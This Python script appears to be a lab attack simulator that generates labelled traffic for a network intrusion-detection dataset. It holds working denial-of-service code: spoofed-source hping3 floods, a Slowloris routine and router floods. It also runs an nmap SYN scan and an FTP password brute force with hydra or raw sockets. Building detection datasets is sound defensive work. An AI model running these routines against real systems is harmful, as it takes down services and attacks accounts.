#!/usr/bin/env python3

import subprocess
import requests
import time
import argparse
import random
import sys
import threading

BACKEND_URL  = "http://10.0.4.11:8080"
INTERFACE    = "eth1"


TARGETS = {
    "web_server":   "10.0.1.2",
    "dns_server":   "10.0.1.3",
    "ftp_server":   "10.0.2.2",
    "db_server":    "10.0.2.3",
    "edge_router":  "10.0.0.1",
    "core_router":  "10.0.3.2",
}


WEB_SERVER_IP  = TARGETS["web_server"]
DNS_SERVER_IP  = TARGETS["dns_server"]
FTP_SERVER_IP  = TARGETS["ftp_server"]
DB_SERVER_IP   = TARGETS["db_server"]
EDGE_ROUTER_IP = TARGETS["edge_router"]
CORE_ROUTER_IP = TARGETS["core_router"]


ATTACK_DURATION = {
    "normal":           120,
    "dos":               60,
    "ddos":              60,
    "synflood":          60,
    "udp_flood":         60,
    "http_flood":        60,
    "ping_of_death":     60,
    "rst_flood":         60,
    "router_dos":        60,
    "router_synflood":   60,
    "portscan":          45,
    "bruteforce":        60,
    "dns_flood":         45,
    "fault":             60,
}

def build_hping3_cmd(base_args, target):

    cmd = ["hping3"] + base_args + ["--flood", target]
    return cmd

def label_start(label: str, device_name: str, interface_name: str = None):
    try:
        body = {"label": label, "deviceName": device_name}
        if interface_name:
            body["interfaceName"] = interface_name

        response = requests.post(f"{BACKEND_URL}/api/label/start", json=body, timeout=5)

        if response.status_code != 200:
            print(f" Server Error: {response.status_code} - Need Token?")
            return

        if interface_name:
            print(f" Label: {device_name}::{interface_name} → {label}")
        else:
            print(f" Label: {device_name} → {label}")
    except Exception as e:
        print(f" Could not set label ({device_name}): {e}")


def label_stop(device_name: str, interface_name: str = None):
    try:
        body = {"deviceName": device_name}
        if interface_name:
            body["interfaceName"] = interface_name
        requests.post(f"{BACKEND_URL}/api/label/stop", json=body, timeout=5)
    except Exception as e:
        print(f" Could not stop label ({device_name}): {e}")

def label_stop_all():
    try:
        requests.post(f"{BACKEND_URL}/api/label/stop-all", timeout=5)
        print(f" All labels cleared")
    except Exception as e:
        print(f" Could not stop all labels: {e}")

def apply_labels(label_map: dict):
    for key, label in label_map.items():
        if "::" in key:
            device, iface = key.split("::", 1)
            label_start(label, device, iface)
        else:
            label_start(label, key)

def stop_labels(label_map: dict):
    for key in label_map:
        if "::" in key:
            device, iface = key.split("::", 1)
            label_stop(device, iface)
        else:
            label_stop(key)

LABEL_MAPS = {
    "normal": {
        "web-server":  "normal",
        "dns-server":  "normal",
        "ssh-server":  "normal",
        "db-server":   "normal",
        "edge-router": "normal",
        "core-router": "normal",
    },

    "dos": {
        "web-server":  "dos",
        "edge-router": "transit",
        "core-router": "transit",
    },

    "ddos": {
        "web-server":  "ddos",
        "edge-router": "transit",
        "core-router": "transit",
    },

    "synflood": {
        "web-server":  "synflood",
        "edge-router": "transit",
        "core-router": "transit",
    },

    "udp_flood": {
        "web-server":  "udp_flood",
        "edge-router": "transit",
        "core-router": "transit",
    },

    "ping_of_death": {
        "web-server":  "ping_of_death",
        "edge-router": "transit",
        "core-router": "transit",
    },

    "dns_flood": {
        "dns-server":  "dns_flood",
        "edge-router": "transit",
        "core-router": "transit",
    },

    "http_flood": {
        "web-server":  "http_flood",
    },

    "rst_flood": {
        "web-server":  "rst_flood",
    },

    "portscan": {
        "db-server":   "portscan",
    },

    "bruteforce": {
        "ftp-server":  "bruteforce",
    },

    "router_dos": {
        "edge-router": "router_dos",
    },

    "router_synflood": {
        "core-router": "router_synflood",
        "edge-router": "transit",
    },

    "fault": {
        "edge-router":         "fault",
        "edge-router::br-wan": "fault",
        "edge-router::eth2":   "normal",
    },
}


def get_dataset_stats():
    try:
        r = requests.get(f"{BACKEND_URL}/api/metrics/dataset/stats", timeout=5)
        stats = r.json()
        print("\n Dataset stats so far:")
        for label, count in sorted(stats.items()):
            bar = "█" * min(int(count // 2), 40)
            print(f"   {label:12s} {count:4d} samples  {bar}")
    except Exception as e:
        print(f"  ⚠️ Could not fetch stats: {e}")


def attack_normal(duration: int):
    print(f"   Collecting normal traffic for {duration}s...")
    print(f"  (no attack — normal system behavior on all devices)")
    time.sleep(duration)


def safe_run(cmd, duration):
    proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    try:
        time.sleep(duration)
    finally:
        proc.terminate()
        proc.wait()


def attack_dos(duration: int):
    print(f"   DoS ICMP Flood → web-server ({WEB_SERVER_IP}) for {duration}s")
    cmd = build_hping3_cmd(["--icmp", "--rand-source", "-d", "120"], WEB_SERVER_IP)
    safe_run(cmd, duration)


def attack_synflood(duration: int):
    print(f"   SYN Flood → web-server ({WEB_SERVER_IP}):80 for {duration}s")
    cmd = build_hping3_cmd(["-S", "--rand-source", "-p", "80", "-d", "64"], WEB_SERVER_IP)
    safe_run(cmd, duration)


def attack_portscan(duration: int):
    print(f"   Port Scan → db-server ({DB_SERVER_IP}) for {duration}s")
    end_time = time.time() + duration
    while time.time() < end_time:
        proc = subprocess.Popen([
            "nmap", "-sS",
            "-p", "1-10000",
            "--max-rate", "1000",
            "-T4",
            DB_SERVER_IP
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        remaining = end_time - time.time()
        try:
            proc.wait(timeout=min(remaining, 20))
        except subprocess.TimeoutExpired:
            proc.terminate()
        if time.time() >= end_time:
            break
        time.sleep(1)


def attack_bruteforce(duration: int):
    print(f"   Brute Force FTP → ftp-server ({FTP_SERVER_IP}):21 for {duration}s")
    try:
        subprocess.run(["which", "hydra"], check=True, capture_output=True)
        proc = subprocess.Popen([
            "hydra",
            "-l", "ftpuser",
            "-P", "/scripts/wordlist.txt",
            "-t", "4",
            "-f",
            f"ftp://{FTP_SERVER_IP}"
        ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try:
            time.sleep(duration)
        finally:
            proc.terminate()
            proc.wait()
    except subprocess.CalledProcessError:
        print(f"  (hydra not found — using custom FTP loop)")
        import socket
        end_time = time.time() + duration
        attempt  = 0
        while time.time() < end_time:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1)
                sock.connect((FTP_SERVER_IP, 21))
                sock.recv(256)
                sock.send(b"USER ftpuser\r\n")
                sock.recv(256)
                sock.send(b"PASS wrongpass\r\n")
                sock.recv(256)
                sock.close()
            except Exception:
                pass
            attempt += 1
            time.sleep(0.1)
        print(f"  (sent {attempt} FTP attempts)")
 
 

def attack_fault(duration: int):
    print(f"   Network Fault on {INTERFACE} for {duration}s")
    print(f"  (200ms delay + 20% packet loss + 2% corruption)")
    subprocess.run([
        "tc", "qdisc", "add", "dev", INTERFACE, "root", "netem",
        "delay", "200ms", "50ms",
        "loss", "20%",
        "corrupt", "2%"
    ], capture_output=True)
    time.sleep(duration)
    subprocess.run([
        "tc", "qdisc", "del", "dev", INTERFACE, "root"
    ], capture_output=True)
    print(f"   Network fault removed — link restored")


def attack_router_dos(duration: int):
    print(f"   Router DoS → edge-router ({EDGE_ROUTER_IP}) for {duration}s")
    print(f"    WARNING: This targets the router itself — may affect all devices!")
    cmd = build_hping3_cmd(["--icmp", "--rand-source", "-d", "120"], EDGE_ROUTER_IP)
    safe_run(cmd, duration)


def attack_router_synflood(duration: int):
    print(f"   Router SYN Flood → core-router ({CORE_ROUTER_IP}) for {duration}s")
    print(f"    WARNING: Targeting core-router — may disconnect DMZ + LAN!")

    procs = []
    for port in ["179", "22", "23"]:
        cmd = build_hping3_cmd(["-S", "--rand-source", "-p", port, "-d", "64"], CORE_ROUTER_IP)
        p = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        procs.append(p)
        print(f" → Flooding port {port}")

    try:
        time.sleep(duration)
    finally:
        for p in procs:
            p.terminate()
            p.wait()


def attack_ddos(duration: int):
    print(f"   DDoS (Distributed) → web-server ({WEB_SERVER_IP}) for {duration}s")
    print(f"  (simulating thousands of sources via --rand-source)")

    procs = []

    cmd1 = build_hping3_cmd(["--icmp", "--rand-source", "-d", "1400"], WEB_SERVER_IP)
    procs.append(subprocess.Popen(cmd1, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))

    cmd2 = build_hping3_cmd(["-S", "--rand-source", "-p", "80", "-d", "64"], WEB_SERVER_IP)
    procs.append(subprocess.Popen(cmd2, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL))

    try:
        time.sleep(duration)
    finally:
        for p in procs:
            p.terminate()
            p.wait()


def attack_udp_flood(duration: int):
    print(f"   UDP Flood → web-server ({WEB_SERVER_IP}):80 for {duration}s")
    cmd = build_hping3_cmd(["--udp", "--rand-source", "-p", "80", "-d", "1400"], WEB_SERVER_IP)
    safe_run(cmd, duration)


def attack_http_flood(duration: int):
    print(f"   HTTP Flood (Slowloris) → web-server ({WEB_SERVER_IP}):80 for {duration}s")
    import socket as sock_module

    MAX_SOCKETS = 1000

    sockets = []
    end_time = time.time() + duration

    print(f"     → Opening {MAX_SOCKETS} initial connections...")
    for _ in range(MAX_SOCKETS):
        try:
            s = sock_module.socket(sock_module.AF_INET, sock_module.SOCK_STREAM)
            s.settimeout(4)
            s.connect((WEB_SERVER_IP, 80))
            s.send(b"GET / HTTP/1.1\r\nHost: target\r\n")
            sockets.append(s)
        except Exception:
            pass

    print(f" → {len(sockets)} connections opened, keeping alive...")

    while time.time() < end_time:
        for s in list(sockets):
            try:
                s.send(b"X-Keep: alive\r\n")
            except Exception:
                sockets.remove(s)
                try:
                    new_s = sock_module.socket(sock_module.AF_INET, sock_module.SOCK_STREAM)
                    new_s.settimeout(4)
                    new_s.connect((WEB_SERVER_IP, 80))
                    new_s.send(b"GET / HTTP/1.1\r\nHost: target\r\n")
                    sockets.append(new_s)
                except Exception:
                    pass
        time.sleep(1)

    for s in sockets:
        try:
            s.close()
        except Exception:
            pass
    print(f"     → All connections closed")


def attack_ping_of_death(duration: int):
    print(f" Ping of Death → web-server ({WEB_SERVER_IP}) for {duration}s")
    print(f" (ICMP packets with 65000 bytes payload)")
    cmd = build_hping3_cmd(["--icmp", "-d", "65000"], WEB_SERVER_IP)
    safe_run(cmd, duration)

def attack_rst_flood(duration: int):
    print(f"   RST Flood → web-server ({WEB_SERVER_IP}):80 for {duration}s")
    cmd = build_hping3_cmd(["-R", "--rand-source", "-p", "80"], WEB_SERVER_IP)
    safe_run(cmd, duration)

def attack_dns_flood(duration: int):
    print(f"   DNS Flood → dns-server ({DNS_SERVER_IP}):53 for {duration}s")
    cmd = build_hping3_cmd(["--udp", "--rand-source", "-p", "53", "-d", "512"], DNS_SERVER_IP)
    safe_run(cmd, duration)

ATTACKS = {
    "normal":          attack_normal,
    "dos":             attack_dos,
    "synflood":        attack_synflood,
    "udp_flood":       attack_udp_flood,
    "http_flood":      attack_http_flood,
    "ping_of_death":   attack_ping_of_death,
    "rst_flood":       attack_rst_flood,
    "portscan":        attack_portscan,
    "bruteforce":      attack_bruteforce,
    "fault":           attack_fault,
    "ddos":            attack_ddos,
    "dns_flood":       attack_dns_flood,
    "router_dos":      attack_router_dos,
    "router_synflood": attack_router_synflood,
}

def run_attack(name: str):
    if name not in ATTACKS:
        print(f" Unknown attack: {name}")
        print(f"   Valid: {list(ATTACKS.keys())}")
        return

    DURATION_RANGE = {
        "normal":        (110, 150),
        "dos":           ( 50,  80),
        "ddos":          ( 50,  80),
        "synflood":      ( 50,  80),
        "udp_flood":     ( 50,  80),
        "http_flood":    ( 55,  70),
        "ping_of_death": ( 50,  75),
        "rst_flood":     ( 50,  80),
        "portscan":      ( 42,  52),
        "bruteforce":    ( 55,  75),
        "dns_flood":     ( 40,  52),
        "router_dos":    ( 50,  75),
        "router_synflood":( 50, 75),
        "fault":         ( 58,  62),
    }
    lo, hi = DURATION_RANGE[name]
    duration = random.randint(lo, hi)
    target = {
        "normal":          "ALL DEVICES (baseline)",
        "dos":             f"web-server  ({WEB_SERVER_IP})",
        "synflood":        f"web-server  ({WEB_SERVER_IP}):80",
        "udp_flood":       f"web-server  ({WEB_SERVER_IP}):80 [UDP]",
        "http_flood":      f"web-server  ({WEB_SERVER_IP}):80 [Slowloris]",
        "ping_of_death":   f"web-server  ({WEB_SERVER_IP}) [ICMP 65KB]",
        "rst_flood":       f"web-server  ({WEB_SERVER_IP}):80 [RST]",
        "portscan":        f"db-server   ({DB_SERVER_IP}):1-10000",
        "bruteforce":      f"ssh-server  ({FTP_SERVER_IP}):22",
        "fault":           f"attacker {INTERFACE} link",
        "ddos":            f"web-server  ({WEB_SERVER_IP}) via routers",
        "dns_flood":       f"dns-server  ({DNS_SERVER_IP}):53",
        "router_dos":      f"edge-router ({EDGE_ROUTER_IP}) ← ROUTER TARGET",
        "router_synflood": f"core-router ({CORE_ROUTER_IP}) ← ROUTER TARGET",
    }.get(name, "unknown")

    label_map = LABEL_MAPS.get(name, {})

    print(f"\n{'═'*60}")
    print(f" Attack : {name.upper()}")
    print(f" Target : {target}")
    print(f" Duration: {duration}s")
    print(f" Labels : {label_map}")
    print(f"{'═'*60}")

    print(" Waiting 15s before attack (network stabilization)...")
    time.sleep(15)

    try:
        if name == "normal":
            apply_labels(label_map)
            ATTACKS[name](duration)
        else:
            attack_done = threading.Event()

            def run_attack_thread():
                ATTACKS[name](duration)
                attack_done.set()

            t = threading.Thread(target=run_attack_thread, daemon=True)
            t.start()

            LABEL_DELAY = 10
            print(f"Attack started — waiting {LABEL_DELAY}s before labeling...")
            time.sleep(LABEL_DELAY)

            apply_labels(label_map)

            attack_done.wait()

    except KeyboardInterrupt:
        print("\n  ⚠️  Attack interrupted by user")
    except Exception as e:
        print(f"  ❌ Attack error: {e}")
    finally:
        stop_labels(label_map)
        label_stop_all()
        print(f"  ✅ Attack '{name}' complete\n")


def run_all():
    order = [
        "normal",
        "dos",
        "synflood",
        "udp_flood",
        "http_flood",
        "ping_of_death",
        "rst_flood",
        "ddos",
        "portscan",
        "dns_flood",
        "router_dos",
        "router_synflood",
        "fault",
    ]

    print("\n🚀 Starting FULL dataset collection")
    print(f"   Total attacks: {len(order)}")
    DURATION_RANGE_ALL = {
        "normal": (110, 150), "dos": (50, 80), "ddos": (50, 80),
        "synflood": (50, 80), "udp_flood": (50, 80), "http_flood": (55, 70),
        "ping_of_death": (50, 75), "rst_flood": (50, 80), "portscan": (42, 52),
        "bruteforce": (55, 75), "dns_flood": (40, 52), "router_dos": (50, 75),
        "router_synflood": (50, 75), "fault": (58, 62),
    }
    avg_attack_time = sum((lo + hi) // 2 for lo, hi in DURATION_RANGE_ALL.values())
    total_sec = avg_attack_time + len(order) * 15 + (len(order) - 1) * 60
    print(f"   Estimated time: ~{total_sec//60} minutes\n")

    for i, attack in enumerate(order):
        print(f"\n[{i+1}/{len(order)}] ══► {attack.upper()}")
        run_attack(attack)

        if i < len(order) - 1:
            print(f"\n  💤 Cooling down 60s (network stabilization)...")
            time.sleep(60)

    print("\n" + "═"*60)
    print("✅ Dataset collection COMPLETE!")
    get_dataset_stats()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="Attack simulator for dataset collection",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""
Examples:
  python3 attack_simulator.py --attack normal
  python3 attack_simulator.py --attack dos
  python3 attack_simulator.py --attack synflood
  python3 attack_simulator.py --attack udp_flood
  python3 attack_simulator.py --attack http_flood
  python3 attack_simulator.py --attack ping_of_death
  python3 attack_simulator.py --attack rst_flood
  python3 attack_simulator.py --attack ddos
  python3 attack_simulator.py --attack portscan
  python3 attack_simulator.py --attack bruteforce
  python3 attack_simulator.py --attack dns_flood
  python3 attack_simulator.py --attack router_dos
  python3 attack_simulator.py --attack router_synflood
  python3 attack_simulator.py --attack fault
  python3 attack_simulator.py --attack all
        """
    )
    parser.add_argument(
        "--attack",
        choices=list(ATTACKS.keys()) + ["all"],
        required=True,
        metavar="ATTACK",
        help="Attack type (use --help to see all)"
    )
    args = parser.parse_args()

    if args.attack == "all":
        run_all()
    else:
        run_attack(args.attack)
        get_dataset_stats()
